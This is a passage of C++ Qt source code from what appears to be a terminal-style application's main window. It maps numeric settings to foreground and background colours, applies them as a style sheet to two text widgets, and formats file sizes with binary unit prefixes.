			foreground_color = new QColor(Qt::darkGreen);
			break;
	}
	switch(BackgroundColor) {
		default:
		case 0:
			background_color = new QColor(Qt::black);
			break;
		case 1:
			background_color = new QColor(Qt::white);
			break;
		case 2:
			background_color = new QColor(Qt::gray);
			break;
		case 3:
			background_color = new QColor(Qt::blue);
			break;
		case 4:
			background_color = new QColor(Qt::green);
			break;
		case 5:
			background_color = new QColor(Qt::red);
			break;
		case 6:
			background_color = new QColor(48, 10, 36);
			break;
		case 7:
			background_color = new QColor(238, 238, 209);
			break;
		case 8:
			background_color = new QColor(154, 149, 205);
			break;
	}
	QString style_sheet;
	int r1, g1, b1, r2, g2, b2;
	foreground_color->getRgb(&r1, &g1, &b1);
	background_color->getRgb(&r2, &g2, &b2);
	style_sheet.sprintf(STYLE_SHEET_FORMAT, r1, g1, b1, r2, g2, b2);
	ui->feedbackTextEdit->setStyleSheet(style_sheet);
	ui->commandLineEdit->setStyleSheet(style_sheet);
	delete foreground_color;
	delete background_color;
}

QString MainWindow::roundFileSize(qint64 size)
{
    double filesize = (double)size;
    //QString units;
    QByteArray units;
    if(filesize<1024)
    {
	units="Byte";
    }else if(filesize<1024*1024)
    {
	units="KiB";
	filesize/=1024;
    }else if(filesize<1024*1024*1024)
    {
	units="MiB";
	filesize/=1024*1024;
    }else
    {
	units="GiB";		// 二进制词头
	filesize/=1024*1024*1024;
    }
    QString sizeText;
    sizeText.sprintf("%0.2lf %s", filesize, units.constData());
    return sizeText;
}
